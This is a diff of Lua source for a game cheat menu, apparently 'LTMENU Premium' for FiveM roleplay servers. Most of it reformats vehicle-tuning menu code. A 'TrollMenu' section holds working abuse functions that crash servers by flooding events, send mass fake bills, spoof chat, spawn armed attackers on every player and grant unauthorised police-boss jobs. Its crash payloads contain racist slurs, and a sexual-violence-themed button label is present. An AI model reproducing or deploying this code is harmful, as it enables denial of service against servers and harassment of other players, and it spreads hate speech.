+                                    bi = "headlight"
+                                    bk = false
+                                    oldhead = GetVehicleHeadlightsColour(veh)
+                                    bh = table.pack(oldhead)
+                                    SetVehicleHeadlightsColour(veh, dA.id)
+                                    bg = true
+                                elseif bg and head == dA.id then
+                                    ToggleVehicleMod(veh, 22, true)
+                                    SetVehicleHeadlightsColour(veh, dA.id)
+                                    bg = false; bi = -1; bh = -1
+                                elseif bg and head ~= dA.id then
+                                    SetVehicleHeadlightsColour(veh, dA.id)
+                                    bg = true
+                                end
+                            end
+                        end
+
+                        LTPREMIUM.Display()
+                    elseif dA.id == "neon" then
+                        if LTPREMIUM.Button("None") then
+                            SetVehicleNeonLightsColour(veh, 255, 255, 255)
+                            SetVehicleNeonLightEnabled(veh, 0, false)
+                            SetVehicleNeonLightEnabled(veh, 1, false)
+                            SetVehicleNeonLightEnabled(veh, 2, false)
+                            SetVehicleNeonLightEnabled(veh, 3, false)
+                        end
+                        for i, dA in pairs(colors) do
+                            colorr, colorg, colorb = table.unpack(dA)
+                            r, g, b = GetVehicleNeonLightsColour(veh)
+                            if colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and not b8 then
+                                pricestring = "Installed"
+                            else
+                                if b8 and colorr == r and colorg == g and colorb == b then
+                                    pricestring = "Previewing"
+                                else
                                     pricestring = "Not Installed"
                                 end
-                                if LTPREMIUM.Button(dA.menuName, pricestring) then 
-                                    SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i)) 
-                                end 
-                            end 
-    
-                            LTPREMIUM.Display() 
-                        elseif dA.id == "headlight" then
-                            if LTPREMIUM.Button("None") then 
-                                SetVehicleHeadlightsColour(veh, -1) 
                             end
-                            for dK, dA in pairs(bo) do 
-                                tp = GetVehicleHeadlightsColour(veh) 
-                                if tp == dA.id and not bg then 
-                                    pricetext = "Installed"
-                                else 
-                                    if bg and tp == dA.id then 
-                                        pricetext = "Previewing"
-                                    else pricetext = "Not Installed"
-                                    end 
+                            if LTPREMIUM.Button(i, pricestring) then
+                                if not b8 then
+                                    ba = "neon"
+                                    bc = IsVehicleNeonLightEnabled(veh, 1)
+                                    oldr, oldg, oldb = GetVehicleNeonLightsColour(veh)
+                                    b9 = table.pack(oldr, oldg, oldb)
+                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
+                                    SetVehicleNeonLightEnabled(veh, 0, true)
+                                    SetVehicleNeonLightEnabled(veh, 1, true)
+                                    SetVehicleNeonLightEnabled(veh, 2, true)
+                                    SetVehicleNeonLightEnabled(veh, 3, true)
+                                    b8 = true
+                                elseif b8 and colorr == r and colorg == g and colorb == b then
+                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
+                                    SetVehicleNeonLightEnabled(veh, 0, true)
+                                    SetVehicleNeonLightEnabled(veh, 1, true)
+                                    SetVehicleNeonLightEnabled(veh, 2, true)
+                                    SetVehicleNeonLightEnabled(veh, 3, true)
+                                    b8 = false
+                                    ba = -1
+                                    b9 = -1
+                                elseif b8 and colorr ~= r or colorg ~= g or colorb ~= b then
+                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
+                                    SetVehicleNeonLightEnabled(veh, 0, true)
+                                    SetVehicleNeonLightEnabled(veh, 1, true)
+                                    SetVehicleNeonLightEnabled(veh, 2, true)
+                                    SetVehicleNeonLightEnabled(veh, 3, true)
+                                    b8 = true
                                 end
-                                head = GetVehicleHeadlightsColour(veh) 
-                                if LTPREMIUM.Button(dA.name, pricetext) then
-                                    if not bg then 
-                                        bi = "headlight"
-                                        bk = false
-                                        oldhead = GetVehicleHeadlightsColour(veh) 
-                                        bh = table.pack(oldhead) 
-                                        SetVehicleHeadlightsColour(veh, dA.id) 
-                                        bg = true 
-                                    elseif bg and head == dA.id then 
-                                        ToggleVehicleMod(veh, 22, true) 
-                                        SetVehicleHeadlightsColour(veh, dA.id) 
-                                        bg = false; bi = -1; bh = -1 
-                                    elseif bg and head ~= dA.id then 
-                                        SetVehicleHeadlightsColour(veh, dA.id) bg = true 
-                                    end 
-                                end 
                             end
-    
-                                LTPREMIUM.Display() 
-                        elseif dA.id == "neon" then
-                            if LTPREMIUM.Button("None") then 
-                                SetVehicleNeonLightsColour(veh, 255, 255, 255) 
-                                SetVehicleNeonLightEnabled(veh, 0, false) 
-                                SetVehicleNeonLightEnabled(veh, 1, false) 
-                                SetVehicleNeonLightEnabled(veh, 2, false) 
-                                SetVehicleNeonLightEnabled(veh, 3, false) 
+                        end
+
+                        LTPREMIUM.Display()
+                    elseif dA.id == "paint" then
+                        if LTPREMIUM.MenuButton("~r~→  ~s~Primary Paint", "primary") then
+                        elseif LTPREMIUM.MenuButton("~r~→  ~s~Secondary Paint", "secondary") then
+                        elseif LTPREMIUM.MenuButton("~r~→  ~s~Wheel Paint", "rimpaint") then
+                        end
+                        LTPREMIUM.Display()
+                    else
+                        local as = checkValidVehicleMods(dA.id)
+                        for dG, dH in pairs(as) do
+                            if dH.menuName == "Stock" then
+                                price = 0
                             end
-                            for i, dA in pairs(colors) do 
-                                colorr, colorg, colorb = table.unpack(dA) 
-                                r, g, b = GetVehicleNeonLightsColour(veh) 
-                                if colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and not b8 then 
-                                    pricestring = "Installed"
-                                else 
-                                    if b8 and colorr == r and colorg == g and colorb == b then 
-                                        pricestring = "Previewing"
-                                    else 
-                                        pricestring = "Not Installed"
-                                    end 
+                            if dA.name == "Horns" then
+                                for dI, dJ in pairs(horns) do
+                                    if dJ == dG - 1 then
+                                        dH.menuName = dI
+                                    end
                                 end
-                                if LTPREMIUM.Button(i, pricestring) then
-                                    if not b8 then 
-                                        ba = "neon"
-                                        bc = IsVehicleNeonLightEnabled(veh, 1) 
-                                        oldr, oldg, oldb = GetVehicleNeonLightsColour(veh) 
-                                        b9 = table.pack(oldr, oldg, oldb) 
-                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
-                                        SetVehicleNeonLightEnabled(veh, 0, true) 
-                                        SetVehicleNeonLightEnabled(veh, 1, true) 
-                                        SetVehicleNeonLightEnabled(veh, 2, true) 
-                                        SetVehicleNeonLightEnabled(veh, 3, true) 
-                                        b8 = true 
-                                    elseif b8 and colorr == r and colorg == g and colorb == b then 
-                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
-                                        SetVehicleNeonLightEnabled(veh, 0, true) 
-                                        SetVehicleNeonLightEnabled(veh, 1, true) 
-                                        SetVehicleNeonLightEnabled(veh, 2, true)
-                                        SetVehicleNeonLightEnabled(veh, 3, true) 
-                                        b8 = false 
-                                        ba = -1 
-                                        b9 = -1 
-                                    elseif b8 and colorr ~= r or colorg ~= g or colorb ~= b then 
-                                        SetVehicleNeonLightsColour(veh, colorr, colorg, colorb) 
-                                        SetVehicleNeonLightEnabled(veh, 0, true) 
-                                        SetVehicleNeonLightEnabled(veh, 1, true) 
-                                        SetVehicleNeonLightEnabled(veh, 2, true)
-                                        SetVehicleNeonLightEnabled(veh, 3, true) 
-                                        b8 = true 
-                                    end 
-                                end 
                             end
-        
-                            LTPREMIUM.Display() 
-                        elseif dA.id == "paint" then
-                            if LTPREMIUM.MenuButton("~r~→  ~s~Primary Paint", "primary") then 
-                            elseif LTPREMIUM.MenuButton("~r~→  ~s~Secondary Paint", "secondary") then 
-                            elseif LTPREMIUM.MenuButton("~r~→  ~s~Wheel Paint", "rimpaint") then 
-                            end 
-                            LTPREMIUM.Display()
-                        else 
-                            local as = checkValidVehicleMods(dA.id) 
-                            for dG, dH in pairs(as) do
-                                if dH.menuName == "Stock" then 
-                                    price = 0 
-                                end
-                                if dA.name == "Horns" then
-                                    for dI, dJ in pairs(horns) do
-                                        if dJ ==dG - 1 then 
-                                            dH.menuName = dI 
-                                        end 
-                                    end 
-                                end
-                                if dH.menuName == "NULL" then 
-                                    dH.menuname = "unknown"
-                                end
-                                if LTPREMIUM.Button(dH.menuName, price) then
-                                    if not b8 then 
-                                        ba = dA.id
-                                        b9 = GetVehicleMod(veh, dA.id) 
-                                        b8 = true
-                                        if dH.data.realIndex == -1 then 
-                                            bc = "rm"
-                                            RemoveVehicleMod(veh, dH.data.modid) 
-                                            b8 = false 
-                                            ba = -1 
-                                            b9 = -1 
-                                            bc = false
-                                        else 
-                                            bc = false 
-                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
-                                        end 
-                                    elseif b8 and GetVehicleMod(veh, dA.id) == dH.data.realIndex then 
-                                        b8 = false 
-                                        ba = -1 
-                                        b9 = -1 
+                            if dH.menuName == "NULL" then
+                                dH.menuname = "unknown"
+                            end
+                            if LTPREMIUM.Button(dH.menuName, price) then
+                                if not b8 then
+                                    ba = dA.id
+                                    b9 = GetVehicleMod(veh, dA.id)
+                                    b8 = true
+                                    if dH.data.realIndex == -1 then
+                                        bc = "rm"
+                                        RemoveVehicleMod(veh, dH.data.modid)
+                                        b8 = false
+                                        ba = -1
+                                        b9 = -1
                                         bc = false
-                                        if dH.data.realIndex == -1 then 
-                                            RemoveVehicleMod(veh, dH.data.modid)
-                                        else 
-                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
-                                        end 
-                                    elseif b8 and GetVehicleMod(veh, dA.id)  ~= dH.data.realIndex then
-                                        if dH.data.realIndex == -1 then 
-                                            RemoveVehicleMod(veh, dH.data.modid) 
-                                            b8 = false 
-                                            ba = -1 
-                                            b9 = -1 
-                                            bc = false
-                                        else 
-                                            SetVehicleMod(veh, dA.id, dH.data.realIndex, false) 
-                                            b8 = true 
-                                        end 
-                                    end 
-                                end 
-                            end 
-                                        LTPREMIUM.Display() 
-                        end 
-                    end 
+                                    else
+                                        bc = false
+                                        SetVehicleMod(veh, dA.id, dH.data.realIndex, false)
+                                    end
+                                elseif b8 and GetVehicleMod(veh, dA.id) == dH.data.realIndex then
+                                    b8 = false
+                                    ba = -1
+                                    b9 = -1
+                                    bc = false
+                                    if dH.data.realIndex == -1 then
+                                        RemoveVehicleMod(veh, dH.data.modid)
+                                    else
+                                        SetVehicleMod(veh, dA.id, dH.data.realIndex, false)
+                                    end
+                                elseif b8 and GetVehicleMod(veh, dA.id) ~= dH.data.realIndex then
+                                    if dH.data.realIndex == -1 then
+                                        RemoveVehicleMod(veh, dH.data.modid)
+                                        b8 = false
+                                        ba = -1
+                                        b9 = -1
+                                        bc = false
+                                    else
+                                        SetVehicleMod(veh, dA.id, dH.data.realIndex, false)
+                                        b8 = true
+                                    end
+                                end
+                            end
+                        end
+                        LTPREMIUM.Display()
+                    end
                 end
-    
+            end
+
             for i, dA in pairs(be) do
                 if LTPREMIUM.IsMenuOpened(dA.id) then
-                if GetVehicleMod(veh, dA.id) == 0 then pricestock = "Not Installed"
-                price1 = "Installed"
-                price2 = "Not Installed"
-                price3 = "Not Installed"
-                price4 = "Not Installed"
-                elseif GetVehicleMod(veh, dA.id) == 1 then pricestock = "Not Installed"
-                price1 = "Not Installed"
-                price2 = "Installed"
-                price3 = "Not Installed"
-                price4 = "Not Installed"
-                elseif GetVehicleMod(veh, dA.id) == 2 then pricestock = "Not Installed"
-                price1 = "Not Installed"
-                price2 = "Not Installed"
-                price3 = "Installed"
-                price4 = "Not Installed"
-                elseif GetVehicleMod(veh, dA.id) == 3 then pricestock = "Not Installed"
-                price1 = "Not Installed"
-                price2 = "Not Installed"
-                price3 = "Not Installed"
-                price4 = "Installed"
-                elseif GetVehicleMod(veh, dA.id) == -1 then pricestock = "Installed"
-                price1 = "Not Installed"
-                price2 = "Not Installed"
-                price3 = "Not Installed"
-                price4 = "Not Installed"
+                    if GetVehicleMod(veh, dA.id) == 0 then
+                        pricestock = "Not Installed"
+                        price1 = "Installed"
+                        price2 = "Not Installed"
+                        price3 = "Not Installed"
+                        price4 = "Not Installed"
+                    elseif GetVehicleMod(veh, dA.id) == 1 then
+                        pricestock = "Not Installed"
+                        price1 = "Not Installed"
+                        price2 = "Installed"
+                        price3 = "Not Installed"
+                        price4 = "Not Installed"
+                    elseif GetVehicleMod(veh, dA.id) == 2 then
+                        pricestock = "Not Installed"
+                        price1 = "Not Installed"
+                        price2 = "Not Installed"
+                        price3 = "Installed"
+                        price4 = "Not Installed"
+                    elseif GetVehicleMod(veh, dA.id) == 3 then
+                        pricestock = "Not Installed"
+                        price1 = "Not Installed"
+                        price2 = "Not Installed"
+                        price3 = "Not Installed"
+                        price4 = "Installed"
+                    elseif GetVehicleMod(veh, dA.id) == -1 then
+                        pricestock = "Installed"
+                        price1 = "Not Installed"
+                        price2 = "Not Installed"
+                        price3 = "Not Installed"
+                        price4 = "Not Installed"
+                    end
+                    if LTPREMIUM.Button("Stock " .. dA.name, pricestock) then
+                        SetVehicleMod(veh, dA.id, -1)
+                    elseif LTPREMIUM.Button(dA.name .. " Upgrade 1", price1) then
+                        SetVehicleMod(veh, dA.id, 0)
+                    elseif LTPREMIUM.Button(dA.name .. " Upgrade 2", price2) then
+                        SetVehicleMod(veh, dA.id, 1)
+                    elseif LTPREMIUM.Button(dA.name .. " Upgrade 3", price3) then
+                        SetVehicleMod(veh, dA.id, 2)
+                    elseif dA.id ~= 13 and dA.id ~= 12 and LTPREMIUM.Button(dA.name .. " Upgrade 4", price4) then
+                        SetVehicleMod(veh, dA.id, 3)
+                    end; LTPREMIUM.Display()
+                end
             end
-            if LTPREMIUM.Button("Stock "..dA.name, pricestock) then 
-                SetVehicleMod(veh, dA.id, -1) 
-            elseif LTPREMIUM.Button(dA.name.." Upgrade 1", price1) then 
-                SetVehicleMod(veh, dA.id, 0) 
-            elseif LTPREMIUM.Button(dA.name.." Upgrade 2", price2) then 
-                SetVehicleMod(veh, dA.id, 1) 
-            elseif LTPREMIUM.Button(dA.name.." Upgrade 3", price3) then 
-                SetVehicleMod(veh, dA.id, 2) 
-            elseif dA.id ~= 13 and dA.id ~= 12 and LTPREMIUM.Button(dA.name.." Upgrade 4", price4) then 
-                SetVehicleMod(veh, dA.id, 3) end; LTPREMIUM.Display() 
-            end 
-        end
 
             if LTPREMIUM.IsMenuOpened("MainMenu") then
                 drawNotification("~h~~r~LTMENU ~s~Premium")
@@ -5886,65 +6020,76 @@ for i, dA in pairs(bd) do
                 elseif LTPREMIUM.Button("Tug Spawner") then
                     TriggerEvent('esx:spawnVehicle', "tug")
                 elseif LTPREMIUM.Button("Remove Your Community Service") then
-                    TriggerServerEvent('esx_communityservice:finishCommunityService',-1)
+                    TriggerServerEvent('esx_communityservice:finishCommunityService', -1)
                 elseif LTPREMIUM.Button("[ESX] Set Police Job") then
-                    TriggerEvent('esx:setJob', {name = "police", label = "Police", grade = 6, grade_name = "boss", grade_label = "LTPREMIUM"})
+                    TriggerEvent('esx:setJob',
+                        { name = "police", label = "Police", grade = 6, grade_name = "boss", grade_label = "LTPREMIUM" })
                 elseif LTPREMIUM.Button("[ESX] Set Ambulance Job") then
-                    TriggerEvent('esx:setJob', {name = "ambulance", label = "ambulance", grade = 6, grade_name = "boss", grade_label = "LTPREMIUM"})
+                    TriggerEvent('esx:setJob',
+                        { name = "ambulance", label = "ambulance", grade = 6, grade_name = "boss", grade_label =
+                        "LTPREMIUM" })
                 elseif LTPREMIUM.Button("[ESX] Set Mechanic Job") then
-                    TriggerEvent('esx:setJob', {name = "mechanic", label = "mechanic", grade = 6, grade_name = "boss", grade_label = "LTPREMIUM"})
-                    end   
+                    TriggerEvent('esx:setJob',
+                        { name = "mechanic", label = "mechanic", grade = 6, grade_name = "boss", grade_label =
+                        "LTPREMIUM" })
+                end
 
-                LTPREMIUM.Display() 
-			                elseif LTPREMIUM.IsMenuOpened("SettingsMenu") then
-                if LTPREMIUM.ComboBox("~r~→  ~s~Menu ~b~X", menuX, currentMenuX, selectedMenuX, function(currentIndex, selectedIndex)
-                    currentMenuX = currentIndex
-                    selectedMenuX = selectedIndex
-                    for i = 1, #allMenus do
-                        LTPREMIUM.SetMenuX(allMenus[i], menuX[currentMenuX])
-                    end
-                    end) 
-                    then
-                elseif LTPREMIUM.ComboBox("~r~→  ~s~Menu ~b~Y", menuY, currentMenuY, selectedMenuY, function(currentIndex, selectedIndex)
-                    currentMenuY = currentIndex
-                    selectedMenuY = selectedIndex
-                    for i = 1, #allMenus do
-                        LTPREMIUM.SetMenuY(allMenus[i], menuY[currentMenuY])
-                    end
-                    end)
-                    then
-                    elseif LTPREMIUM.CheckBox("~u~Discord~s~ Display", discordPresence, function(enabled) discordPresence = enabled end) then
-					elseif LTPREMIUM.MenuButton("~r~→  ~s~Information", "InfoMenu") then
-                    elseif LTPREMIUM.MenuButton("~r~→  ~s~Credits", "Credits") then
-                    end
-    
-                    LTPREMIUM.Display()
-                elseif LTPREMIUM.IsMenuOpened("InfoMenu") then
-                    if LTPREMIUM.Button("LTPREMIUM") then
-					elseif LTPREMIUM.Button("https://discord.gg/8nSCR6u") then
-                    end
-    
-                    LTPREMIUM.Display()
-                elseif LTPREMIUM.IsMenuOpened("CreditsMenu") then
-				if     LTPREMIUM.Button("~h~Here <3") then
-				elseif LTPREMIUM.Button("∑  ~r~~h~tedakaxd~s~ - ~r~DEV") then
-				drawNotification('~h~Contact him for More releases.')
-				drawNotification('~h~Also contact him if you want to purchase any menu.')
-				elseif LTPREMIUM.Button("∑  ~r~~h~Lezy~s~ - ~r~Semi-Helper") then
-				end
-					
-					LTPREMIUM.Display()
-            elseif LTPREMIUM.IsMenuOpened("TrollMenu") then
-                if LTPREMIUM.Button("ESX Server Crasher") then
-                    for i = 1, 50000 do TriggerServerEvent("esx_skin:responseSaveSkin", {niggers = "gay"}) TriggerServerEvent("esx_skin:responseSaveSkin", "niggers eat shit") end
-                elseif  LTPREMIUM.CheckBox(
-                    "Send everyone to jail",
-                    banallusers,
-                    function(enabled)
-                    banallusers = enabled
+                LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("SettingsMenu") then
+                if LTPREMIUM.ComboBox("~r~→  ~s~Menu ~b~X", menuX, currentMenuX, selectedMenuX, function(currentIndex,
+                                                                                                         selectedIndex)
+                        currentMenuX = currentIndex
+                        selectedMenuX = selectedIndex
+                        for i = 1, #allMenus do
+                            LTPREMIUM.SetMenuX(allMenus[i], menuX[currentMenuX])
+                        end
                     end)
                 then
-				elseif LTPREMIUM.Button("Spawn moutain Lion On Everyone") then
+                elseif LTPREMIUM.ComboBox("~r~→  ~s~Menu ~b~Y", menuY, currentMenuY, selectedMenuY, function(
+                        currentIndex, selectedIndex)
+                        currentMenuY = currentIndex
+                        selectedMenuY = selectedIndex
+                        for i = 1, #allMenus do
+                            LTPREMIUM.SetMenuY(allMenus[i], menuY[currentMenuY])
+                        end
+                    end)
+                then
+                elseif LTPREMIUM.CheckBox("~u~Discord~s~ Display", discordPresence, function(enabled) discordPresence =
+                        enabled end) then
+                elseif LTPREMIUM.MenuButton("~r~→  ~s~Information", "InfoMenu") then
+                elseif LTPREMIUM.MenuButton("~r~→  ~s~Credits", "Credits") then
+                end
+
+                LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("InfoMenu") then
+                if LTPREMIUM.Button("LTPREMIUM") then
+                elseif LTPREMIUM.Button("https://discord.gg/8nSCR6u") then
+                end
+
+                LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("CreditsMenu") then
+                if LTPREMIUM.Button("~h~Here <3") then
+                elseif LTPREMIUM.Button("∑  ~r~~h~tedakaxd~s~ - ~r~DEV") then
+                    drawNotification('~h~Contact him for More releases.')
+                    drawNotification('~h~Also contact him if you want to purchase any menu.')
+                elseif LTPREMIUM.Button("∑  ~r~~h~Lezy~s~ - ~r~Semi-Helper") then
+                end
+
+                LTPREMIUM.Display()
+            elseif LTPREMIUM.IsMenuOpened("TrollMenu") then
+                if LTPREMIUM.Button("ESX Server Crasher") then
+                    for i = 1, 50000 do
+                        TriggerServerEvent("esx_skin:responseSaveSkin", { niggers = "gay" })
+                        TriggerServerEvent("esx_skin:responseSaveSkin", "niggers eat shit")
+                    end
+                elseif LTPREMIUM.CheckBox(
+                        "Send everyone to jail",
+                        banallusers,
+                        function(enabled)
+                            banallusers = enabled
+                        end)
+                then
+                elseif LTPREMIUM.Button("Spawn moutain Lion On Everyone") then
                     local mtlion = "A_C_MtLion"
                     for i = 0, 128 do
                         local co = GetEntityCoords(GetPlayerPed(i))
@@ -5969,9 +6114,9 @@ for i, dA in pairs(bd) do
                             end
                         end
                     end
-				elseif LTPREMIUM.Button("SWAT W/ Railgun On Everyone") then
+                elseif LTPREMIUM.Button("SWAT W/ Railgun On Everyone") then
                     local swat = "s_m_y_swat_01"
-					local bR = "weapon_railgun"
+                    local bR = "weapon_railgun"
                     for i = 0, 128 do
                         local coo = GetEntityCoords(GetPlayerPed(i))
                         RequestModel(GetHashKey(swat))
@@ -5979,16 +6124,16 @@ for i, dA in pairs(bd) do
                         if HasModelLoaded(GetHashKey(swat)) then
                             local ped =
                                 CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
-								CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
-								CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
-								CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
+                            CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
+                            CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
+                            CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
                             NetworkRegisterEntityAsNetworked(ped)
                             if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                 local ei = PedToNet(ped)
                                 NetworkSetNetworkIdDynamic(ei, false)
                                 SetNetworkIdCanMigrate(ei, true)
                                 SetNetworkIdExistsOnAllMachines(ei, true)
-								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
+                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                 SetPedCanSwitchWeapon(ped, true)
                                 NetToPed(ei)
                                 TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
@@ -6001,22 +6146,23 @@ for i, dA in pairs(bd) do
                     end
                 elseif LTPREMIUM.Button("Nuke Server") then
                     nukeserver()
-				elseif LTPREMIUM.Button("Esx Destroy V2") then
-				    esxdestroyv2()
-				elseif LTPREMIUM.Button("~g~ESX SEND EVERYONE A CUSTOM BILL") then
+                elseif LTPREMIUM.Button("Esx Destroy V2") then
+                    esxdestroyv2()
+                elseif LTPREMIUM.Button("~g~ESX SEND EVERYONE A CUSTOM BILL") then
                     local amount = KeyboardInput("Enter Amount", "", 100000000)
                     local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
                     if amount and name then
-                    for i = 0, 128 do
-                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
+                        for i = 0, 128 do
+                            TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
+                        end
                     end
-				end
-				elseif LTPREMIUM.Button("~g~ESX SEND EVERYONE TONS OF BILLS") then
-				for i = 0, 128 do
-                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "LTMENU Premium, LTMENU ON YOUTUBE", "99999999")
-                end
-				elseif LTPREMIUM.Button("VRP Destroy V2") then
-				    vrpdestroy()
+                elseif LTPREMIUM.Button("~g~ESX SEND EVERYONE TONS OF BILLS") then
+                    for i = 0, 128 do
+                        TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless",
+                            "LTMENU Premium, LTMENU ON YOUTUBE", "99999999")
+                    end
+                elseif LTPREMIUM.Button("VRP Destroy V2") then
+                    vrpdestroy()
                 elseif LTPREMIUM.Button("Rape All Players") then
                     RapeAllFunc()
                 elseif LTPREMIUM.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
@@ -6074,9 +6220,9 @@ for i, dA in pairs(bd) do
                             )
                         end
                     end
-				elseif LTPREMIUM.CheckBox("Fuck economy ~g~ESX", esxdestroy, function(enabled) esxdestroy = enabled end) then
+                elseif LTPREMIUM.CheckBox("Fuck economy ~g~ESX", esxdestroy, function(enabled) esxdestroy = enabled end) then
                 elseif LTPREMIUM.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
-			    elseif LTPREMIUM.CheckBox("Handcuff everyone", freezeall, function(enabled) freezeall = enabled end) then
+                elseif LTPREMIUM.CheckBox("Handcuff everyone", freezeall, function(enabled) freezeall = enabled end) then
                 elseif LTPREMIUM.CheckBox("Spawn stuff On Everyone", sall, function(enabled) sall = enabled end) then
                 elseif LTPREMIUM.Button("Crash All Players") then
                     for i = 0, 128 do
@@ -6085,11 +6231,11 @@ for i, dA in pairs(bd) do
                         end
                     end
                 elseif LTPREMIUM.Button("Fake Message") then
-                    local da=KeyboardInput("Enter player name","",100)
+                    local da = KeyboardInput("Enter player name", "", 100)
                     if da then
-                        local ck=KeyboardInput("Enter message","",1000)
+                        local ck = KeyboardInput("Enter message", "", 1000)
                         if ck then
-                            TriggerServerEvent("_chat:messageEntered",da,{0,0x99,255},ck)
+                            TriggerServerEvent("_chat:messageEntered", da, { 0, 0x99, 255 }, ck)
                         end
                     end
                 elseif LTPREMIUM.Button("ESX Set All Police") then
@@ -6113,22 +6259,22 @@ for i, dA in pairs(bd) do
                 elseif LTPREMIUM.Button("~b~TP~s~ To Coordinates") then
                     TeleportToCoords()
                 elseif LTPREMIUM.CheckBox(
-                    "Show Your Coordinates",
-                    showCoords,
-                    function(enabled)
-                        showCoords = enabled
-                    end)
+                        "Show Your Coordinates",
+                        showCoords,
+                        function(enabled)
+                            showCoords = enabled
+                        end)
                 then
                 end
 
                 LTPREMIUM.Display()
-			elseif LTPREMIUM.IsMenuOpened("AI") then
-			                if LTPREMIUM.Button("~h~Configure The ~g~Speed") then
+            elseif LTPREMIUM.IsMenuOpened("AI") then
+                if LTPREMIUM.Button("~h~Configure The ~g~Speed") then
                     cspeed = KeyboardInput("Enter Wanted MaxSpeed", "", 100)
-					local c1 = 1.0
-					cspeed = tonumber(cspeed)
-					if cspeed == nil then
-											drawNotification(
+                    local c1 = 1.0
+                    cspeed = tonumber(cspeed)
+                    if cspeed == nil then
+                        drawNotification(
                             '~~r~Invalid Speed you dumbass~s~.'
                         )
                         drawNotification(
@@ -6138,7 +6284,7 @@ for i, dA in pairs(bd) do
                         ojtgh = (cspeed .. ".0")
                         SetDriveTaskMaxCruiseSpeed(GetPlayerPed(-1), tonumber(ojtgh))
                     end
-					
+
                     SetDriverAbility(GetPlayerPed(-1), 100.0)
                 elseif LTPREMIUM.Button("Drive to waypoint ~o~SLOW") then
                     if DoesBlipExist(GetFirstBlipInfoId(8)) then
@@ -6176,19 +6322,19 @@ for i, dA in pairs(bd) do
                         ClearPedTasks(GetPlayerPed(-1))
                     else
                         ClearPedTasksImmediately(GetPlayerPed(-1))
-				    end
-				end
-				                LTPREMIUM.Display()
+                    end
+                end
+                LTPREMIUM.Display()
             elseif LTPREMIUM.IsMenuOpened("VehMenu") then
-						if LTPREMIUM.Button("Remote Car") then
-			RCCAR123 = KeyboardInput("Enter Car Name", "", 1000000)
-			            if RCCAR123 and IsModelValid(RCCAR123) and IsModelAVehicle(RCCAR123) then
-			RCCar.Start()
+                if LTPREMIUM.Button("Remote Car") then
+                    RCCAR123 = KeyboardInput("Enter Car Name", "", 1000000)
+                    if RCCAR123 and IsModelValid(RCCAR123) and IsModelAVehicle(RCCAR123) then
+                        RCCar.Start()
                     else
                         drawNotification("~r~Model Isn't Valid You Tard")
                     end
-              elseif LTPREMIUM.MenuButton('~r~→  ~s~Vehicle List', 'CarTypes') then
-		 elseif LTPREMIUM.Button("Spawn A Custom Vehicle") then
+                elseif LTPREMIUM.MenuButton('~r~→  ~s~Vehicle List', 'CarTypes') then
+                elseif LTPREMIUM.Button("Spawn A Custom Vehicle") then
                     local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
                     if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                         RequestModel(ModelName)
@@ -6196,82 +6342,84 @@ for i, dA in pairs(bd) do
                             Citizen.Wait(-1000)
                         end
 
-                        local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)
+                        local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()),
+                            GetEntityHeading(PlayerPedId()), true, true)
                         if DelCurVeh then
                             DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
                             drawNotification("Vehicle Just Got Deleted")
                         end
-                            SetPedIntoVehicle(PlayerPedId(), veh, -1)
-					local playerPed = GetPlayerPed(-1)
-					local playerVeh = GetVehiclePedIsIn(playerPed, true)
-						SetVehicleNumberPlateText(playerVeh, "LTMENU")
+                        SetPedIntoVehicle(PlayerPedId(), veh, -1)
+                        local playerPed = GetPlayerPed(-1)
+                        local playerVeh = GetVehiclePedIsIn(playerPed, true)
+                        SetVehicleNumberPlateText(playerVeh, "LTMENU")
                     else
                         drawNotification("~r~Model Isn't Valid You Tard")
                     end
-            elseif LTPREMIUM.Button("Repair Vehicle") then
+                elseif LTPREMIUM.Button("Repair Vehicle") then
                     SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                     SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                     SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                     SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                     Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
